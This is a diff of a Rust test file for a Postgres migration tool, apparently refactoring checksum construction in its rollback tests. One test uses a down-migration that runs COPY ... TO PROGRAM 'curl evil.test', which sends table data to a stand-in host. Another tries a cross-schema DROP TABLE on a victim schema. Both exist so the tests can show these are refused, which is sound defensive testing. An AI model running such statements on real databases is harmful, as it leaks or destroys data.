@@ -95,12 +95,12 @@ fn create_table_mig(
 ) -> Migration {
     let up = format!("CREATE TABLE \"{}\".\"{table}\" (id bigint)", cfg.project_schema);
     let down = format!("DROP TABLE \"{}\".\"{table}\"", cfg.project_schema);
-    Migration {
+    let mut __mig = Migration {
         version,
         name: format!("create_{table}"),
         up: up.clone(),
         down: Some(down.clone()),
-        checksum: Checksum::of(&up, Some(&down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags {
             destructive: false,
             ..MigrationFlags::default()
@@ -109,7 +109,9 @@ fn create_table_mig(
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    }
+    };
+    __mig.recompute_checksum();
+    __mig
 }
 
 async fn table_exists(conn: &Client, schema: &str, table: &str) -> bool {
@@ -337,18 +339,18 @@ async fn rollback_refuses_irreversible_without_force_then_skips_with_force() {
     let v3 = MigrationId::generate();
     let m1 = create_table_mig(v1, &cfg, "t1");
     let up2 = format!("CREATE TABLE \"{}\".\"t2\" (id bigint)", cfg.project_schema);
-    let m2 = Migration {
+    let m2 = { let mut __mig = Migration {
         version: v2,
         name: "irreversible_t2".into(),
         up: up2.clone(),
         down: None,
-        checksum: Checksum::of(&up2, None, &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     let m3 = create_table_mig(v3, &cfg, "t3");
     let set = [m1.clone(), m2.clone(), m3.clone()];
     apply(&conn, &cfg, &set, Approval::None, "actor").await.expect("seed");
@@ -414,18 +416,18 @@ async fn force_skip_irreversible_refuses_when_a_dependency_is_rolled_back_beneat
     let m1 = {
         let up = format!("CREATE TABLE \"{schema}\".\"orders\" (id bigint PRIMARY KEY)");
         let down = format!("DROP TABLE \"{schema}\".\"orders\"");
-        Migration {
+        { let mut __mig = Migration {
             version: v1.clone(),
             name: "create_orders".into(),
             up: up.clone(),
             down: Some(down.clone()),
-            checksum: Checksum::of(&up, Some(&down), &[]),
+            checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
             flags: MigrationFlags::default(),
             owner_app: "app_test".into(),
             depends_on: Vec::new(),
             supersedes: Vec::new(),
             preconditions: Vec::new(),
-        }
+        }; __mig.recompute_checksum(); __mig }
     };
     // v2: audit with FK to orders, IRREVERSIBLE, depends_on v1.
     let m2 = {
@@ -433,18 +435,18 @@ async fn force_skip_irreversible_refuses_when_a_dependency_is_rolled_back_beneat
             "CREATE TABLE \"{schema}\".\"audit\" \
              (id bigint PRIMARY KEY, order_id bigint REFERENCES \"{schema}\".\"orders\"(id))"
         );
-        Migration {
+        { let mut __mig = Migration {
             version: v2.clone(),
             name: "irreversible_audit".into(),
             up: up.clone(),
             down: None,
-            checksum: Checksum::of(&up, None, &[]),
+            checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
             flags: MigrationFlags::default(),
             owner_app: "app_test".into(),
             depends_on: vec![v1.clone()],
             supersedes: Vec::new(),
             preconditions: Vec::new(),
-        }
+        }; __mig.recompute_checksum(); __mig }
     };
     let set = [m1.clone(), m2.clone()];
     apply(&conn, &cfg, &set, Approval::None, "actor").await.expect("seed (orders then audit)");
@@ -480,18 +482,18 @@ async fn force_requires_both_force_and_backup_acknowledged() {
 
     let v1 = MigrationId::generate();
     let up = format!("CREATE TABLE \"{}\".\"t1\" (id bigint)", cfg.project_schema);
-    let m1 = Migration {
+    let m1 = { let mut __mig = Migration {
         version: v1,
         name: "irreversible".into(),
         up: up.clone(),
         down: None,
-        checksum: Checksum::of(&up, None, &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     apply(&conn, &cfg, std::slice::from_ref(&m1), Approval::None, "actor").await.expect("seed");
 
     // force without backup_acknowledged is NOT enough.
@@ -534,36 +536,36 @@ async fn rollback_runs_downs_in_reverse_topological_order_of_depends_on() {
     // B: parent table.
     let b_up = format!("CREATE TABLE \"{schema}\".\"parent\" (id bigint PRIMARY KEY)");
     let b_down = format!("DROP TABLE \"{schema}\".\"parent\"");
-    let m_b = Migration {
+    let m_b = { let mut __mig = Migration {
         version: vb.clone(),
         name: "create_parent".into(),
         up: b_up.clone(),
         down: Some(b_down.clone()),
-        checksum: Checksum::of(&b_up, Some(&b_down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     // A: child with a REAL FK to parent; depends_on B.
     let a_up = format!(
         "CREATE TABLE \"{schema}\".\"child\" \
          (id bigint PRIMARY KEY, parent_id bigint REFERENCES \"{schema}\".\"parent\"(id))"
     );
     let a_down = format!("DROP TABLE \"{schema}\".\"child\"");
-    let m_a = Migration {
+    let m_a = { let mut __mig = Migration {
         version: va.clone(),
         name: "create_child".into(),
         up: a_up.clone(),
         down: Some(a_down.clone()),
-        checksum: Checksum::of(&a_up, Some(&a_down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: vec![vb.clone()],
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
 
     // Supply A first (lower version) to prove ordering is by depends_on, not slice
     // order. Apply topo-orders B (parent) before A (child).
@@ -653,18 +655,18 @@ async fn rollback_to_version_refuses_when_a_kept_migration_depends_on_a_rolled_b
     // B: parent table (HIGHER version — selected by ToVersion(va) since vb > va).
     let b_up = format!("CREATE TABLE \"{schema}\".\"parent\" (id bigint PRIMARY KEY)");
     let b_down = format!("DROP TABLE \"{schema}\".\"parent\"");
-    let m_b = Migration {
+    let m_b = { let mut __mig = Migration {
         version: vb.clone(),
         name: "create_parent".into(),
         up: b_up.clone(),
         down: Some(b_down.clone()),
-        checksum: Checksum::of(&b_up, Some(&b_down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     // A: child with a REAL FK to parent; depends_on B (LOWER version — KEPT by the
     // ToVersion(va) threshold since va is NOT > va).
     let a_up = format!(
@@ -672,18 +674,18 @@ async fn rollback_to_version_refuses_when_a_kept_migration_depends_on_a_rolled_b
          (id bigint PRIMARY KEY, parent_id bigint REFERENCES \"{schema}\".\"parent\"(id))"
     );
     let a_down = format!("DROP TABLE \"{schema}\".\"child\"");
-    let m_a = Migration {
+    let m_a = { let mut __mig = Migration {
         version: va.clone(),
         name: "create_child".into(),
         up: a_up.clone(),
         down: Some(a_down.clone()),
-        checksum: Checksum::of(&a_up, Some(&a_down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: vec![vb.clone()],
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
 
     let set = [m_a.clone(), m_b.clone()];
     apply(&conn, &cfg, &set, Approval::None, "actor").await.expect("seed apply (topo: B then A)");
@@ -755,18 +757,18 @@ async fn rollback_all_diamond_unwinds_in_reverse_topological_order() {
     std::thread::sleep(Duration::from_millis(2));
     let vd = MigrationId::generate();
 
-    let mk = |version: MigrationId, name: &str, up: String, down: String, deps: Vec<MigrationId>| Migration {
+    let mk = |version: MigrationId, name: &str, up: String, down: String, deps: Vec<MigrationId>| { let mut __mig = Migration {
         version,
         name: name.into(),
         up: up.clone(),
         down: Some(down.clone()),
-        checksum: Checksum::of(&up, Some(&down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: deps,
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
 
     let m_a = mk(
         va.clone(),
@@ -861,18 +863,18 @@ async fn rollback_all_multiroot_forest_unwinds_cleanly() {
     std::thread::sleep(Duration::from_millis(2));
     let vq2 = MigrationId::generate();
 
-    let mk = |version: MigrationId, name: &str, up: String, down: String, deps: Vec<MigrationId>| Migration {
+    let mk = |version: MigrationId, name: &str, up: String, down: String, deps: Vec<MigrationId>| { let mut __mig = Migration {
         version,
         name: name.into(),
         up: up.clone(),
         down: Some(down.clone()),
-        checksum: Checksum::of(&up, Some(&down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: deps,
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
 
     let m_p1 = mk(
         vp1.clone(),
@@ -952,18 +954,18 @@ async fn dangerous_down_is_guard_denied_and_nothing_rolled_back() {
     let v = MigrationId::generate();
     let up = format!("CREATE TABLE \"{}\".\"t\" (id bigint)", cfg.project_schema);
     let down = format!("COPY \"{}\".\"t\" TO PROGRAM 'curl evil.test'", cfg.project_schema);
-    let m = Migration {
+    let m = { let mut __mig = Migration {
         version: v,
         name: "rce_down".into(),
         up: up.clone(),
         down: Some(down.clone()),
-        checksum: Checksum::of(&up, Some(&down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     apply(&conn, &cfg, std::slice::from_ref(&m), Approval::None, "actor").await.expect("seed (up is benign)");
     assert!(table_exists(&conn, &cfg.project_schema, "t").await);
 
@@ -1000,18 +1002,18 @@ async fn cross_schema_down_is_permission_denied_by_the_migrator_role() {
     let v = MigrationId::generate();
     let up = format!("CREATE TABLE \"{}\".\"t\" (id bigint)", cfg.project_schema);
     let down = "DO $$ BEGIN EXECUTE format('DROP TABLE %I.secret', 'rb_foreign_victim'); END $$;".to_string();
-    let m = Migration {
+    let m = { let mut __mig = Migration {
         version: v,
         name: "xschema_down".into(),
         up: up.clone(),
         down: Some(down.clone()),
-        checksum: Checksum::of(&up, Some(&down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     apply(&conn, &cfg, std::slice::from_ref(&m), Approval::None, "actor").await.expect("seed");
 
     let err = rollback(&conn, &cfg, std::slice::from_ref(&m), RollbackRequest::new(RollbackTarget::All), Approval::Approved, "actor")
@@ -1097,18 +1099,18 @@ async fn non_transactional_down_is_refused_up_front_and_nothing_rolled_back() {
         cfg.project_schema
     );
     let down = format!("DROP INDEX CONCURRENTLY \"{}\".\"some_idx\"", cfg.project_schema);
-    let m = Migration {
+    let m = { let mut __mig = Migration {
         version: v,
         name: "non_txn_down".into(),
         up: up.clone(),
         down: Some(down.clone()),
-        checksum: Checksum::of(&up, Some(&down), &[]),
+        checksum: Checksum::of(&zeroship_migrate::ChecksumInput { up: "", down: None, flags: &MigrationFlags::default(), owner_app: "", depends_on: &[], supersedes: &[], preconditions: &[] }),
         flags: MigrationFlags::default(),
         owner_app: "app_test".into(),
         depends_on: Vec::new(),
         supersedes: Vec::new(),
         preconditions: Vec::new(),
-    };
+    }; __mig.recompute_checksum(); __mig };
     apply(&conn, &cfg, std::slice::from_ref(&m), Approval::None, "actor")
         .await
         .expect("seed (up is transactional)");
